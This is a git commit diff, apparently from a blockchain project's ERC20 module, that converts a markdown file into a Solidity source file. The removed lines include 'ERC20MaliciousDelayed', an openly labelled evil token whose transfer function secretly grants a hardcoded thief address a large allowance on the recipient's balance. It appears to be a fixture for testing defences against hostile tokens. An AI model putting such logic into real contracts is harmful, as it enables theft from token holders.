8eccdb898285dd1560e27ad8a6f945072a554511
Daniel Burckhardt <daniel.m.burckhardt@gmail.com>
2022-01-07 19:06:26 +0100

    add openzeppelin npm package and solidity contracts

--- x/erc20/types/contracts/ERC20MinterBurnerDecimals.sol
+++ x/erc20/types/contracts/ERC20MinterBurnerDecimals.sol
@@ -1,8 +1,3 @@
-# Raw Contracts
-
-## ERC20MinterBurnerDecimals
-
-```
 // SPDX-License-Identifier: MIT
 // OpenZeppelin Contracts v4.3.2 (token/ERC20/presets/ERC20PresetMinterPauser.sol)
 
@@ -128,32 +123,3 @@ contract ERC20MinterBurnerDecimals is Context, AccessControlEnumerable, ERC20Bur
         super._beforeTokenTransfer(from, to, amount);
     }
 }
-```
-
-## ERC20MaliciousDelayed
-
-```sol
-// SPDX-License-Identifier: MIT
-
-pragma solidity ^0.8.0;
-import "node_modules/@openzeppelin/contracts/token/ERC20/presets/ERC20PresetMinterPauser.sol";
-
-// This is an evil token. Whenever an A -> B transfer is called,
-// a predefined C is given a massive allowance on B.
-contract ERC20MaliciousDelayed is ERC20PresetMinterPauser {
-  address private _thief = 0x4dC6ac40Af078661fc43823086E1513635Eeab14;
-  uint256 private _bigNum = 1000000000000000000; // ~uint256(0)
-  constructor(uint256 initialSupply)
-    ERC20PresetMinterPauser("ERC20MaliciousDelayed", "ERC20MALICIOUSDELAYED") {
-      _setupRole(DEFAULT_ADMIN_ROLE, msg.sender);
-      _mint(msg.sender, initialSupply);
-
-  }
-  function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
-    // Any time a transaction happens, the thief account is granted allowance in secret.
-    // Still emits an Approve!
-    super._approve(recipient, _thief, _bigNum);
-    return super.transfer(recipient, amount);
-  }
-}
-```
